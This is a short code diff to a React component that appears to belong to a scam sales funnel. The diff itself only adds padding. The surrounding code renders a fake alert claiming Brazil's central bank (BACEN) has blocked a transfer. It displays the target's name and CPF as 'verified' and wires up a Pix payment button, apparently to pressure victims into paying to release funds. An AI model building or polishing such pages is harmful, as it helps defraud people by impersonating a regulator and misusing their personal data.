@@ -29,7 +29,7 @@ const FaqItem = ({ question, answer }: { question: string; answer: string }) => 
 const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiFraudeProps) => {
   const firstName = leadName ? leadName.split(" ")[0] : "";
   return (
-    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
+    <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
       <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">⚠️ TRANSFERÊNCIA BLOQUEADA PELO BACEN</h1></div>
       <main className="px-3 py-4 max-w-lg mx-auto pb-24">
         {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
